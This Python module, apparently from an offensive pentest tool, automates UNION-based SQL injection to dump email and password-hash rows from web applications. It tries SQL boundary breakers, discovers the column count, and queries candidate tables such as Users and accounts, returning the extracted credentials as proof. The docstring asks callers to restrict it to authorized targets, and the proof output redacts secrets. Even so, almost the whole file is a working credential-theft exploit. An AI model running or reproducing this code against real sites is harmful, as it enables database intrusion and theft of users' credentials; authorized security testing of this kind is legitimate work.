"""
core/wraith/exfiltration.py

Make the data_exfiltration goal REAL.

The hunt synthesizes and verifies chains that *reach* data_exfiltration — but
reaching a goal (the steps confirm) is not the same as demonstrating it. This
module closes that gap for the most common case: a confirmed UNION-injectable
SQLi. It actually extracts a credentials table and returns the dumped rows as
proof. "This chain reaches data_exfiltration" becomes "here are 23 user
emails + password hashes I pulled out."

Approach (bounded, best-effort, honest):
  1. Discover the working boundary + UNION column count (UNION SELECT N NULLs
     until the SQL error clears).
  2. Place email/password into reflected columns and SELECT FROM a credentials
     table, trying a small ordered candidate set.
  3. Parse credential-shaped rows (emails + password hashes) that were NOT in
     the benign baseline.

Honesty gate: returns a result ONLY when real credential-shaped data comes back.
No dump → the chain stays "verified via steps", never a fabricated exfil claim.
`send` is injectable for tests. This is real exploitation — callers MUST gate it
(active mode, scope, authorized target).
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

logger = logging.getLogger(__name__)

# SQL context breakers, most-specific first (Juice Shop's search needs `'))`).
_BOUNDARIES = ["'))", "')", "'", "\")", "\"))"]
# Candidate credential tables.
_CRED_TABLES = ["Users", "users", "Account", "accounts", "members", "user", "credentials"]
# The column-count mismatch error specifically (NOT bare "SQL" — that matches
# benign data). When this clears as we vary the UNION arity, the count matches.
_COLCOUNT_ERROR = re.compile(
    r"same number of result columns|number of result columns|"
    r"columns in the two|do not have the same",
    re.IGNORECASE,
)
# Any SQL error (used to skip a non-existent table during extraction).
_SQL_ERROR = re.compile(r"SQLITE_ERROR|no such table|syntax error", re.IGNORECASE)
_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
# MD5/SHA1/SHA256 hex, or bcrypt.
_HASH_RE = re.compile(r"\b[a-f0-9]{32}\b|\b[a-f0-9]{40}\b|\b[a-f0-9]{64}\b|\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}")

# (url) -> (status, body_text). Async; injectable for tests.
Fetch = Callable[[str], Awaitable[Tuple[int, str]]]


@dataclass
class ExfilResult:
    table: str
    payload: str
    rows: List[Tuple[str, str]] = field(default_factory=list)  # (email, secret)
    row_count: int = 0

    def to_proof(self, sample: int = 5) -> Dict[str, Any]:
        return {
            "technique": "UNION-based SQL injection",
            "table": self.table,
            "rows_extracted": self.row_count,
            "payload": self.payload,
            # Redact the secret to a fingerprint — proof of access, not a dump
            # we hand around in cleartext.
            "sample": [
                {"email": e, "secret": (s[:6] + "…" + f"[{len(s)} chars]") if s else ""}
                for e, s in self.rows[:sample]
            ],
        }


def _inject(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query or "", keep_blank_values=True))
    base = params.get(param) or "qwert"
    params[param] = f"{base}{value}"
    return urlunparse(parsed._replace(query=urlencode(params)))


def _parse_credentials(body: str, baseline_emails: set) -> List[Tuple[str, str]]:
    """Pull (email, hash) pairs that weren't already in the benign response."""
    out: List[Tuple[str, str]] = []
    seen: set = set()
    # Look for email immediately followed (within ~80 chars) by a hash — the
    # shape of a leaked credentials row.
    for m in _EMAIL_RE.finditer(body):
        email = m.group(0)
        if email in baseline_emails or email in seen:
            continue
        window = body[m.end(): m.end() + 120]
        hm = _HASH_RE.search(window)
        if hm:
            seen.add(email)
            out.append((email, hm.group(0)))
    return out


async def exfiltrate_credentials(
    url: str,
    param: str,
    fetch: Fetch,
    *,
    max_attempts: int = 40,
) -> Optional[ExfilResult]:
    """Attempt a bounded UNION-based credential dump on a confirmed SQLi param.

    Returns an ExfilResult only when real credential-shaped rows are extracted.
    Never raises.
    """
    # Baseline: benign request, to know which emails are "normal" page content.
    try:
        _, baseline_body = await fetch(_inject(url, param, ""))
    except Exception:
        baseline_body = ""
    baseline_emails = set(_EMAIL_RE.findall(baseline_body))

    attempts = 0
    for boundary in _BOUNDARIES:
        # 1. Discover the column count: vary the UNION arity (no FROM, so it's
        #    table-independent) until the column-mismatch error disappears.
        ncols = None
        for n in range(1, 14):
            if attempts >= max_attempts:
                return None
            attempts += 1
            nulls = ",".join(["NULL"] * n)
            probe = f"{boundary} UNION SELECT {nulls}-- -"
            try:
                _, body = await fetch(_inject(url, param, probe))
            except Exception:
                continue
            # Count matches once the column-mismatch error is gone (a different
            # downstream error may remain — that's fine, the arity is right).
            if not _COLCOUNT_ERROR.search(body):
                ncols = n
                break
        if ncols is None:
            continue

        # 2. Extract: place email/password into reflected columns, FROM a
        #    candidate table. Try each (table, position) combo; a non-existent
        #    table errors and we move on.
        for table in _CRED_TABLES:
            for pos in range(0, max(1, ncols - 1)):
                if attempts >= max_attempts:
                    return None
                attempts += 1
                cols = [str(i + 1) for i in range(ncols)]
                cols[pos] = "email"
                if pos + 1 < ncols:
                    cols[pos + 1] = "password"
                payload = f"{boundary} UNION SELECT {','.join(cols)} FROM {table}-- -"
                try:
                    _, body = await fetch(_inject(url, param, payload))
                except Exception:
                    continue
                if _SQL_ERROR.search(body):
                    break  # table doesn't exist / bad shape → next table
                creds = _parse_credentials(body, baseline_emails)
                if creds:
                    logger.info("[exfil] dumped %d credential row(s) from %s", len(creds), table)
                    return ExfilResult(table=table, payload=payload, rows=creds,
                                       row_count=len(creds))
    return None


def default_fetch(timeout: float = 10.0):
    """Real httpx GET fetcher carrying the deconfliction header."""
    async def _fetch(url: str) -> Tuple[int, str]:
        import httpx
        import os
        headers = {"User-Agent": "SentinelForge-Exfil"}
        _bb = os.getenv("SENTINEL_GHOST_BB_VALUE", "").strip()
        if _bb:
            headers[os.getenv("SENTINEL_GHOST_BB_HEADER", "X-Bug-Bounty").strip()] = _bb
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as c:
            r = await c.get(url, headers=headers)
            return r.status_code, r.text
    return _fetch
